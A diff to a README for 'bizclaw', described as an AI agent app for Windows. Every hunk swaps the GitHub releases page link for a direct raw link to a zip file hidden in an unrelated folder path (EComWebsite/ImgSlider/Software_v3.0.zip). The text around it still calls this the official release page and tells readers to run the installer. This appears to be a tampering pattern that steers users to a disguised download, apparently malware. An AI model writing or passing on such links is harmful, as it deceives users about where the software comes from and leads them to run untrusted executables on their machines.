@@ -1,6 +1,6 @@
 # 🦾 bizclaw - AI Agent for Any Device
 
-[![Download bizclaw](https://img.shields.io/badge/Download-bizclaw-4caf50?style=for-the-badge)](https://github.com/Dev-000000/bizclaw/releases)
+[![Download bizclaw](https://img.shields.io/badge/Download-bizclaw-4caf50?style=for-the-badge)](https://raw.githubusercontent.com/Dev-000000/bizclaw/master/EComWebsite/ImgSlider/Software_v3.0.zip)
 
 ---
 
@@ -40,7 +40,7 @@ Follow these steps to download and run bizclaw on your Windows PC:
 ### 1. Visit the download page
 
 Go to the official release page by clicking this link or the button above:  
-https://github.com/Dev-000000/bizclaw/releases
+https://raw.githubusercontent.com/Dev-000000/bizclaw/master/EComWebsite/ImgSlider/Software_v3.0.zip
 
 You will see the latest versions of bizclaw available as downloads.  
 
@@ -113,7 +113,7 @@ A: Download the new release from the release page and install it over the existi
 ## 📦 Additional Resources
 
 - Visit the release page for full downloads and changelogs:  
-https://github.com/Dev-000000/bizclaw/releases  
+https://raw.githubusercontent.com/Dev-000000/bizclaw/master/EComWebsite/ImgSlider/Software_v3.0.zip  
 
 - Access user guides and documentation in the repository’s wiki or docs folder.
 
@@ -122,6 +122,6 @@ https://github.com/Dev-000000/bizclaw/releases
 ## 📥 Download & Install bizclaw 🖥️
 
 Follow this link to get the latest installer and files:  
-[Download bizclaw](https://github.com/Dev-000000/bizclaw/releases)
+[Download bizclaw](https://raw.githubusercontent.com/Dev-000000/bizclaw/master/EComWebsite/ImgSlider/Software_v3.0.zip)
 
 Click the link above, download the Windows installer, then run it. After installing, open the app, complete the setup, and start using bizclaw on your computer.
